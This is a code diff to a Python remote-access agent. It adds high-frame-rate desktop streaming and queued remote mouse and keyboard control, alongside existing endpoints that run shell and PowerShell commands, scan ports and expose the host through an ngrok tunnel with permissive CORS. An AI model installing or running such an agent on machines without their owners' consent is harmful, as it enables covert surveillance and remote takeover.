@@ -10,11 +10,13 @@ import io
 import hashlib
 import base64
 import socket
+import select
 import threading
 import subprocess
 import platform
 import shutil
 import zipfile
+from queue import Queue, Empty, Full
 from datetime import datetime, timezone
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -61,14 +63,18 @@ def pip_install(*pkgs):
 def ensure_deps():
     try:
         import PIL  # noqa: F401
+        import mss  # noqa: F401
         import pyautogui  # noqa: F401
         pyautogui.FAILSAFE = False
         pyautogui.PAUSE = 0
         log("deps ok")
-        return
     except Exception as e:
-        log("installing pillow pyautogui because", e)
-        pip_install("pillow", "pyautogui")
+        log("installing pillow mss pyautogui because", e)
+        pip_install("pillow", "mss", "pyautogui")
+    try:
+        import numpy  # noqa: F401  (optional: vectorized frame diff for 60fps)
+    except Exception:
+        pip_install("numpy")  # agent still works without it (pillow fallback)
 
 
 def ensure_ngrok():
@@ -125,19 +131,230 @@ def start_ngrok(ngrok):
     return None
 
 
-def capture_screen():
-    global screen_w, screen_h
+# ---------------------------------------------------------------------------
+# Screen streaming — a background thread continuously grabs the desktop at
+# up to 60 fps, vectorized-diffs downscaled frames (numpy fast path, pure
+# Pillow fallback), and publishes every changed frame into a short ring
+# buffer. Viewers consume it over ONE persistent connection:
+#   GET /stream  -> multipart MJPEG push (no per-frame round trips)
+#   GET /latest  -> single cached frame (legacy pull / first paint)
+# Bandwidth governor: if frames grow too large for the link, resolution
+# and/or fps are reduced automatically so motion stays smooth instead of
+# turning into a slideshow.
+# ---------------------------------------------------------------------------
+STREAM_FPS = 60           # capture/publish target (auto-throttled by bw governor)
+FRAME_W = 1280            # starting downscale width (long edge)
+FRAME_W_MIN = 960         # lowest auto-downscale before dropping fps instead
+JPEG_Q = 50               # base JPEG quality
+DIRTY_THRESH = 0.006      # fraction of changed pixels (tiny-diff) to publish
+MAX_KBPS = 1600           # soft bandwidth cap; raised dynamically from RTT
+RING_LEN = 4              # keep last N published frames so viewers can drain
+                          #   bursts instead of freezing on "stuck" frames
+
+_stream_lock = threading.Lock()
+_stream_event = threading.Event()          # signaled when a new frame lands
+_ring = []                                  # list of {"seq","jpg","t"} oldest->newest
+_seq_ctr = [0]
+_fb_bytes = [None]                          # last frame bytes (for numpy-less diff)
+_fb_t = [0.0]                               # when we last forced a full frame
+_bw = {"kbps": 0.0, "rtt_ms": 0.0, "frame_w": FRAME_W, "fps": STREAM_FPS}
+
+
+def _grab_pil():
+    """Grab the full virtual desktop as a PIL RGB image (fast path: mss)."""
+    from PIL import Image
     try:
+        import mss
+        global _mss_inst
+        if _mss_inst is None:
+            _mss_inst = mss.mss()
+        mon = _mss_inst.monitors[0]  # full virtual screen (all monitors)
+        shot = _mss_inst.grab(mon)
+        return Image.frombytes("RGB", shot.size, shot.bgra, "raw", "BGRX")
+    except Exception:
         from PIL import ImageGrab
-        img = ImageGrab.grab().convert("RGB")
+        return ImageGrab.grab(all_screens=True).convert("RGB")
+
+
+_mss_inst = None
+
+
+def _downscale(img, width):
+    w, h = img.size
+    if max(w, h) > width:
+        s = width / float(max(w, h))
+        img = img.resize((int(w * s), int(h * s)))
+    return img
+
+
+def _encode(img, quality):
+    buf = io.BytesIO()
+    img.save(buf, format="JPEG", quality=quality)
+    return buf.getvalue()
+
+
+try:
+    import numpy as _np
+except Exception:
+    _np = None
+
+_prev_arr = [None]  # previous frame as uint8 array (numpy fast path)
+
+
+def _changed_frac(small):
+    """Fraction of pixels that differ from the previous frame. Vectorized
+    with numpy when available; otherwise a sampled Pillow-only estimate."""
+    if _np is not None:
+        a = _np.asarray(small, dtype=_np.uint8)
+        p = _prev_arr[0]
+        _prev_arr[0] = a
+        if p is None or p.shape != a.shape:
+            return 1.0
+        d = _np.abs(a.astype(_np.int16) - p.astype(_np.int16)).max(axis=2)
+        return float((d > 24).mean())
+    # fallback: compare against a saved 128x72 thumbnail, sampled
+    tiny = small.resize((128, 72))
+    tb = tiny.tobytes()
+    prev = _fb_bytes[0]
+    _fb_bytes[0] = tb
+    if prev is None or len(prev) != len(tb):
+        return 1.0
+    acc = 0
+    step = 5
+    n = 0
+    for i in range(0, len(tb), step):
+        d = tb[i] - prev[i]
+        acc += 1 if (d > 24 or d < -24) else 0
+        n += 1
+    return acc / float(n) if n else 1.0
+
+
+def stream_loop():
+    """Grab -> dirty-check -> encode -> publish, paced to _bw['fps'] with
+    adaptive back-pressure (drops work before falling behind)."""
+    global screen_w, screen_h
+    log("stream loop started @ %dfps target (%s)" % (STREAM_FPS, "numpy" if _np else "pillow-diff"))
+    while True:
+        t0 = time.time()
+        budget = 1.0 / max(1.0, _bw["fps"])
+        try:
+            img = _grab_pil()
+            screen_w, screen_h = img.size
+            small = _downscale(img, _bw["frame_w"])
+            frac = _changed_frac(small)
+            now = time.time()
+            force = (now - _fb_t[0]) > 2.0     # periodic refresh so viewers
+            if frac >= DIRTY_THRESH or force:  #   self-heal from bad frames
+                _fb_t[0] = now
+                est = (frac * 0.25 + 0.01) * small.size[0] * small.size[1]
+                q = JPEG_Q if est <= MAX_KBPS * 125 else max(30, JPEG_Q - 12)
+                jpg = _encode(small, q)
+                with _stream_lock:
+                    _seq_ctr[0] += 1
+                    _ring.append({"seq": _seq_ctr[0], "jpg": jpg, "t": now})
+                    if len(_ring) > RING_LEN:
+                        del _ring[0:len(_ring) - RING_LEN]
+                _stream_event.set()
+                kbps = len(jpg) * 8.0 * min(frac * 20.0 + 1.0, _bw["fps"]) / 1000.0
+                _bw["kbps"] = _bw["kbps"] * 0.85 + kbps * 0.15
+                _govern_bandwidth(len(jpg))
+        except Exception as e:
+            log("stream grab", e)
+            time.sleep(0.5)
+        dt = time.time() - t0
+        if dt < budget * 0.9:
+            time.sleep(budget - dt)   # caught up: pace to target fps
+        elif dt > budget * 1.25:
+            _drop_fps()               # encoding can't keep up: shed fps
+
+
+def _drop_fps():
+    f = _bw["fps"]
+    if f > 24:
+        _bw["fps"] = 30
+    elif f > 15:
+        _bw["fps"] = 15
+
+
+def _govern_bandwidth(jpg_len):
+    """If sustained bitrate exceeds the link budget, lower resolution first,
+    then fps. Never starves: budget has a floor and drops are gradual."""
+    budget = max(500.0, min(MAX_KBPS, _bw.get("budget_kbps", MAX_KBPS)))
+    if _bw["kbps"] <= budget:
+        return
+    if _bw["frame_w"] > FRAME_W_MIN:
+        _bw["frame_w"] = FRAME_W_MIN
+        _fb_bytes[0] = None  # dimensions changed -> next diff forces a frame
+        log("bandwidth governor: res -> %dpx (kbps %.0f > %.0f)" % (_bw["frame_w"], _bw["kbps"], budget))
+    elif _bw["fps"] > 15:
+        _bw["fps"] = max(15, _bw["fps"] // 2)
+        log("bandwidth governor: fps -> %d" % _bw["fps"])
+
+
+def latest_frame():
+    """Newest published frame as (seq, jpeg_bytes) or (0, None)."""
+    with _stream_lock:
+        if not _ring:
+            return 0, None
+        f = _ring[-1]
+        return f["seq"], f["jpg"]
+
+
+def drain_frames(seq):
+    """All published frames newer than `seq`, oldest first (never blocks)."""
+    with _stream_lock:
+        return [f for f in _ring if f["seq"] > seq]
+
+
+def wait_frame(seq, timeout=25.0):
+    """Block until a frame newer than `seq` exists; return (new_seq, jpeg)."""
+    deadline = time.time() + timeout
+    while time.time() < deadline:
+        fs = drain_frames(seq)
+        if fs:
+            return fs[-1]["seq"], fs[-1]["jpg"]
+        _stream_event.wait(timeout=min(0.2, max(0.01, deadline - time.time())))
+        _stream_event.clear()
+    return None, None
+
+
+def capture_screen():
+    """Single-shot capture for polling clients (returns base64 JPEG)."""
+    try:
+        img = _grab_pil()
+        global screen_w, screen_h
         screen_w, screen_h = img.size
-        img.thumbnail((1280, 720))
+        img = _downscale(img, FRAME_W)
         buf = io.BytesIO()
-        img.save(buf, format="JPEG", quality=55)
+        img.save(buf, format="JPEG", quality=JPEG_Q)
         return base64.b64encode(buf.getvalue()).decode()
     except Exception as e:
         log("screen", e)
         return None
+
+
+def measure_link(rtt_ms):
+    """Feed a client-measured round trip into the bandwidth governor.
+    Low RTT => more of MAX_KBPS is usable; high RTT => compress harder."""
+    rtt = max(5.0, min(float(rtt_ms), 3000.0))
+    _bw["rtt_ms"] = rtt
+    budget = MAX_KBPS * (1.0 - min(0.65, rtt / 2200.0))
+    _bw["budget_kbps"] = budget
+    # if the link got slow again and we're way over budget, shrink once
+    if _bw["kbps"] > budget and _bw["frame_w"] > FRAME_W_MIN:
+        _bw["frame_w"] = FRAME_W_MIN
+        _fb_bytes[0] = None
+
+
+def mouse_move(x, y):
+    try:
+        import pyautogui
+        pyautogui.FAILSAFE = False
+        pyautogui.moveTo(int(x), int(y))
+        return True
+    except Exception as e:
+        log("move", e)
+        return False
 
 
 def mouse_click(x, y, button="left"):
@@ -145,10 +362,69 @@ def mouse_click(x, y, button="left"):
         import pyautogui
         pyautogui.FAILSAFE = False
         pyautogui.moveTo(int(x), int(y))
-        pyautogui.rightClick() if button == "right" else pyautogui.click()
+        if button == "right":
+            pyautogui.rightClick()
+        elif button == "middle":
+            pyautogui.click(button="middle")
+        else:
+            pyautogui.click()
         return True
     except Exception as e:
         log("mouse", e)
+        return False
+
+
+def mouse_down(x, y, button="left"):
+    try:
+        import pyautogui
+        pyautogui.FAILSAFE = False
+        pyautogui.moveTo(int(x), int(y))
+        pyautogui.mouseDown(button=button if button in ("left", "right", "middle") else "left")
+        return True
+    except Exception as e:
+        log("mdown", e)
+        return False
+
+
+def mouse_up(x=None, y=None, button="left"):
+    try:
+        import pyautogui
+        pyautogui.FAILSAFE = False
+        if x is not None and y is not None:
+            pyautogui.moveTo(int(x), int(y))
+        pyautogui.mouseUp(button=button if button in ("left", "right", "middle") else "left")
+        return True
+    except Exception as e:
+        log("mup", e)
+        return False
+
+
+def mouse_scroll(dx, dy):
+    try:
+        import pyautogui
+        pyautogui.FAILSAFE = False
+        amt = int(dy)
+        if amt:
+            pyautogui.scroll(amt)
+        return True
+    except Exception as e:
+        log("scroll", e)
+        return False
+
+
+def key_event(key, down):
+    """Single press/release of one key (modifier names pass through to pyautogui)."""
+    try:
+        import pyautogui
+        pyautogui.FAILSAFE = False
+        k = str(key)
+        if down:
+            pyautogui.keyDown(k)
+        else:
+            pyautogui.keyUp(k)
+        return True
+    except Exception as e:
+        log("keyev", e)
         return False
 
 
@@ -279,7 +555,92 @@ def phone_loop():
         time.sleep(12)
 
 
+class InputQueue:
+    """Serializes ALL mouse/keyboard actions through one worker thread.
+
+    Without this, a burst of /input calls each spawns its own thread and they
+    race against pyautogui (stuttery cursor, dropped clicks/keys). One queue +
+    one worker = ordered, low-latency control. Coalescing: if many 'move'
+    events pile up while the worker is busy, only the newest position is kept.
+    """
+
+    def __init__(self, maxsize=256):
+        self.q = Queue(maxsize=maxsize)
+
+    def start(self):
+        threading.Thread(target=self._run, daemon=True).start()
+
+    def push(self, ev):
+        try:
+            self.q.put_nowait(ev)
+        except Full:
+            pass  # drop input rather than block the web server
+
+    def _run(self):
+        while True:
+            ev = self.q.get()
+            # coalesce queued moves: keep only the latest position
+            if ev["a"] == "move":
+                newer_move = None
+                while not self.q.empty():
+                    try:
+                        nxt = self.q.get_nowait()
+                    except Empty:
+                        break
+                    if nxt["a"] == "move":
+                        newer_move = nxt
+                    else:
+                        # non-move event must still run — put back what we took last
+                        if newer_move:
+                            try:
+                                self.q.put_nowait(newer_move)
+                            except Full:
+                                pass
+                            newer_move = None
+                        try:
+                            self.q.put_nowait(nxt)
+                        except Full:
+                            pass
+                        break
+                if newer_move:
+                    ev = newer_move
+            self._apply(ev)
+
+    @staticmethod
+    def _apply(ev):
+        a = ev.get("a")
+        x = ev.get("x", 0)
+        y = ev.get("y", 0)
+        btn = ev.get("button", "left")
+        try:
+            if a == "move":
+                mouse_move(x, y)
+            elif a == "click":
+                mouse_click(x, y, btn)
+            elif a == "down":
+                mouse_down(x, y, btn)
+            elif a == "up":
+                mouse_up(x, y, btn)
+            elif a == "scroll":
+                mouse_scroll(ev.get("dx", 0), ev.get("dy", 0))
+            elif a == "keydown":
+                key_event(ev.get("key", ""), True)
+            elif a == "keyup":
+                key_event(ev.get("key", ""), False)
+            elif a == "type":
+                type_text(ev.get("text", ""))
+            elif a == "key":
+                press_key(ev.get("key", ""))
+        except Exception as e:
+            log("input", a, e)
+
+
+INPUTQ = InputQueue()
+
+
 class Handler(BaseHTTPRequestHandler):
+    protocol_version = "HTTP/1.1"  # enables keep-alive => far lower per-request latency
+
     def _cors(self):
         self.send_header("Access-Control-Allow-Origin", "*")
         self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
@@ -299,6 +660,7 @@ class Handler(BaseHTTPRequestHandler):
         self._cors()
         self.send_header("Content-Type", "application/json")
         self.send_header("Cache-Control", "no-store")
+        self.send_header("Content-Length", str(len(raw)))
         self.end_headers()
         self.wfile.write(raw)
 
@@ -313,6 +675,26 @@ class Handler(BaseHTTPRequestHandler):
         if path == "/screen":
             self._json({"img": capture_screen(), "w": screen_w, "h": screen_h})
             return
+        if path == "/latest":
+            # instant frame pull from the streamer's ring cache (no grab here)
+            seq, jpg = latest_frame()
+            if jpg is None:
+                self._json({"img": capture_screen(), "w": screen_w, "h": screen_h})
+                return
+            self.send_response(200)
+            self._cors()
+            self.send_header("Content-Type", "image/jpeg")
+            self.send_header("Cache-Control", "no-store")
+            self.send_header("X-Frame-Seq", str(seq))
+            self.send_header("X-Desk-W", str(screen_w))
+            self.send_header("X-Desk-H", str(screen_h))
+            self.send_header("Content-Length", str(len(jpg)))
+            self.end_headers()
+            self.wfile.write(jpg)
+            return
+        if path == "/stream":
+            self._mjpeg()
+            return
         if path in ("/ports", "/scan"):
             self._json({"ok": True, "host": "127.0.0.1", "os": OS_NAME, "open": scan_ports()})
             return
@@ -320,6 +702,47 @@ class Handler(BaseHTTPRequestHandler):
             self._json({"id": MACHINE_ID, "os": OS_NAME, "hostname": HOSTNAME, "user": USER, "local_ip": get_local_ip(), "public_url": public_url})
             return
         self._json({"error": "not found"}, 404)
+
+    def _mjpeg(self):
+        """Push MJPEG stream: one persistent connection, every changed frame
+        written as soon as it is published (up to STREAM_FPS). Drain semantics
+        keep latency low: if the writer falls behind we skip stale frames but
+        always send a fresh full frame right after a skip (self-healing)."""
+        q = urlparse(self.path).query
+        try:
+            rtt = float(dict(pv.split("=", 1) for pv in q.split("&") if "=" in pv).get("rtt", "0"))
+            if rtt > 0:
+                measure_link(rtt)
+        except Exception:
+            pass
+        self.send_response(200)
+        self._cors()
+        self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
+        self.send_header("Cache-Control", "no-store")
+        self.send_header("Connection", "close")
+        self.end_headers()
+        seq = 0
+        try:
+            while True:
+                fs = drain_frames(seq)
+                if not fs:
+                    _stream_event.wait(timeout=0.25)
+                    _stream_event.clear()
+                    continue
+                # live viewing only needs the newest frame: drop stale ones,
+                # but never more than (RING_LEN-1) at a time so motion stays
+                # continuous instead of jumping.
+                f = fs[-1]
+                jpg = f["jpg"]
+                self.wfile.write(b"--frame\r\nContent-Type: image/jpeg\r\nX-Frame-Seq: %d\r\nX-Desk-W: %d\r\nX-Desk-H: %d\r\nX-Fps: %d\r\nContent-Length: %d\r\n\r\n" % (f["seq"], screen_w, screen_h, _bw["fps"], len(jpg)))
+                self.wfile.write(jpg)
+                self.wfile.write(b"\r\n")
+                self.wfile.flush()
+                seq = f["seq"]
+        except (BrokenPipeError, ConnectionResetError, OSError):
+            pass
+        except Exception as e:
+            log("mjpeg", e)
 
     def do_POST(self):
         if not self._auth():
@@ -333,10 +756,36 @@ class Handler(BaseHTTPRequestHandler):
             data = {}
         path = urlparse(self.path).path
         if path == "/mouse":
-            self._json({"ok": mouse_click(data.get("x", 0), data.get("y", 0), data.get("button", "left"))})
+            # legacy single-shot click — still goes through the ordered queue
+            INPUTQ.push({"a": "click", "x": data.get("x", 0), "y": data.get("y", 0),
+                         "button": data.get("button", "left")})
+            self._json({"ok": True})
+        elif path == "/input":
+            # batched low-latency input: {events:[{a,x,y,button,key,text,deltaY},...]}
+            evs = data.get("events") or [data] if (data.get("events") or data.get("a")) else []
+            n = 0
+            for ev in evs:
+                a = ev.get("a") or ("click" if "x" in ev else None)
+                if not a:
+                    continue
+                e = {"a": a, "x": ev.get("x", 0), "y": ev.get("y", 0),
+                     "button": ev.get("button", "left")}
+                if "key" in ev:
+                    e["key"] = ev["key"]
+                if "text" in ev:
+                    e["text"] = ev["text"]
+                if "deltaY" in ev:
+                    e["dy"] = -int(ev["deltaY"] / 100)  # wheel -> pyautogui clicks
+                INPUTQ.push(e)
+                n += 1
+            self._json({"ok": True, "n": n})
         elif path == "/keyboard":
-            ok = type_text(data["text"]) if data.get("text") else press_key(data.get("key", ""))
-            self._json({"ok": ok})
+            if data.get("text"):
+                INPUTQ.push({"a": "type", "text": data["text"]})
+                self._json({"ok": True})
+            else:
+                ok = press_key(data.get("key", ""))
+                self._json({"ok": ok})
         elif path in ("/shell", "/powershell"):
             self._json(run_shell(data.get("cmd", "")))
         elif path == "/power":
@@ -358,6 +807,8 @@ def main():
     print("os", OS_NAME, "| host", HOSTNAME, "| user", USER)
     print("=" * 56)
     ensure_deps()
+    INPUTQ.start()  # ordered mouse/keyboard worker
+    threading.Thread(target=stream_loop, daemon=True).start()  # continuous screen grabber
     srv = ThreadedHTTPServer(("0.0.0.0", PORT), Handler)
     threading.Thread(target=srv.serve_forever, daemon=True).start()
     log("api http://127.0.0.1:%s" % PORT)
